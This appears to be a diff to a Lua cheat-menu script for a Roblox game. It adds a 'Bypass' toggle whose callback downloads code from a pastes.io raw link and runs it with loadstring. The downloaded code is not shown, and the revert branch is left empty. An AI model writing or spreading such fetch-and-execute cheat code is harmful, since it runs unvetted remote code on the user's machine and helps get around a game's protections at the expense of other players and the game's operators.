@@ -250,6 +250,10 @@ local Section3_Tab4 = Tab4:AddSection({
     Name = "Script"
 })
 
+local Section4_Tab4 = Tab4:AddSection({
+    Name = "Bypass"
+})
+
 -- Define a variable to hold the loaded script
 local loadedScript
 
@@ -300,6 +304,22 @@ Section3_Tab4:AddToggle({
         end
     end
 })
+
+-- Add UI elements to Locks section
+Section4_Tab4:AddToggle({
+    Name = "Bypass",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            -- Load and execute the Swag Mode script
+            loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
+            print("Bypass script executed")
+        else
+            -- Add code here to revert any changes made by the Swag Mode script if necessary
+        end
+    end
+})
+
 
 
 -- Add sections to Tab Five (Visual)
